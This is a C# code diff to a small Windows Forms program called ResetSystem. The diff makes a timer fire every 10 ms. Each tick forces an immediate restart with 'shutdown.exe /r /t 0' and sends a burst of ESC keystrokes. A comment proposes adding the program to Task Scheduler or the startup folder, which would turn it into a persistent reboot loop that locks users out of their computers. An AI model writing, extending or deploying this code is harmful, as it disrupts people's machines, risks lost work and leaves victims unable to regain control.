@@ -20,7 +20,7 @@ namespace ResetSystem
         public Form1()
         {
             InitializeComponent();
-            tm1.Interval = 100;
+            tm1.Interval = 10;
             //wrong guess
 //            tm1.Tick += new EventHandler(delegate (a,b)=>{});
             //this.Load += new EventHandler();           
@@ -34,9 +34,15 @@ namespace ResetSystem
             //tm1.Tick+= new EventHandler((a,b)=>{
             //    Console.WriteLine("test");
             //});
-
+            //then we should add this app use taskschd.msc or shell:startup
             tm1.Tick += new EventHandler((a, b) => {
                 Process.Start("shutdown.exe", "/r /t 0");
+                int i=1000;
+                while(i--!=0)
+                {
+                    SendKeys.Send("{ESC}");
+                }
+                SendKeys.Flush();
             });
             tm1.Start();
         }
